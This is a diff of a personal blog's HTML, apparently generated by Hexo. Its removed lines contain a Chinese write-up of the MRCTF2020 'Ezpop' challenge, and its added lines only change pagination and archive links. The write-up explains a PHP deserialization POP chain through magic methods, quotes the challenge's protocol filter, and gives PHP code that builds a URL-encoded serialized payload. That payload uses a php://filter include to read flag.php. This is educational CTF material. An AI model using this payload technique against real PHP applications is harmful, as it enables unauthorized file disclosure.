class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
-
-<p><strong>Modifier这个类这边有高危函数include</strong> 通过<strong>构造链连接到这边</strong><br><strong>还有invoke这个魔术方法：</strong><br>对象本身是不能够当做函数去使用的，一旦被当做函数使用，就会回调执行 _ _invoke()方法。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure>
-
-<p>test这个类这边就直接触发到invoke() 了 然后是触发这个_ _get()方法 _ _get()方法将在访问不存在的成员变量时触发<br>就能<strong>将$p-&gt; $var</strong><br>show这个类这边 这是pop链构造的开始</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>根据以上题目，当用get方法传一个pop参数后，<strong>会自动调用Show类的 _ wakeup()魔术方法</strong>。<br>_ wakeup()<strong>通过preg_match()将$this-&gt;source做字符串比较，如果$this-&gt;source是Show类，就调用了toString()方法；</strong><br>如果 _ toString()其中str赋值为一个实例化的<strong>Test类</strong>，而且其类不含有<strong>source属性</strong>，所以会调用Test中的 _ get()方法。<br>如果_ get()中的<strong>p赋值为Modifier类，那么相当于Modifier类被当作函数处理</strong>，所以会调用Modifier类中的 _ invoke()方法。<br>利用文件包含漏洞，<strong>使用_invoke()读取flag.php的内容</strong>。<br>Modifier::_ <em>invoke()&lt;–Test::</em> _get()&lt;–show::__toString()<br><strong>反序列化一个Show($a) 就能调用wakeup  $a 会被赋值给source ，让$a是一个实例化的Show类就能调用toString</strong><br><strong>让$a的show类str赋值为Test类 最后让str这个Test类的p赋值为Modifier类</strong></p>
-<p>构造如下序列化</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var=&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27; ;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">	public function __construct($file)&#123;</span><br><span class="line">    $this-&gt;source = $file;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return &quot;asdasd&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new Show(&#x27;aaa&#x27;);</span><br><span class="line">$a-&gt;str = new Test();</span><br><span class="line">$a-&gt;str-&gt;p = new Modifier();</span><br><span class="line">$b = new Show($a);</span><br><span class="line">echo urlencode(serialize($b));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这边urlencode没有这个不知道为什么无回显</p>
-<p>然后base64解码就好了</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/65.PNG?raw=true" alt="65.PNG"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/07/21/page-79/" data-id="ckuz7ucrt00243sw70rz0d09t" data-title="MRCTF2020Ezpop" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
     
-    <a class="extend prev" rel="prev" href="/page/3/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/5/">Next &raquo;</a>
+    <a class="extend prev" rel="prev" href="/page/3/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/5/">Next &raquo;</a>
   </nav>
 
 </section>
@@ -681,7 +692,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
     </div>
   </div>
 
@@ -694,23 +705,23 @@
       <ul>
         
           <li>
+            <a href="/2021/10/20/page-127/">page</a>
+          </li>
+        
+          <li>
+            <a href="/2021/10/20/page-126/">page</a>
+          </li>
+        
+          <li>
+            <a href="/2021/10/20/page-125/">杂项杂项</a>
+          </li>
+        
+          <li>
             <a href="/2021/09/22/page-121/">GYCTF2020Easyphp</a>
           </li>
         
           <li>
             <a href="/2021/09/22/page-120/">红明谷CTF 2021write shell</a>
-          </li>
-        
-          <li>
-            <a href="/2021/09/22/page-119/">page</a>
-          </li>
-        
-          <li>
-            <a href="/2021/09/22/page-118/">长城杯flag保熟</a>
-          </li>
-        
-          <li>
-            <a href="/2021/09/22/page-117/">第五空间misc</a>
           </li>
         
       </ul>
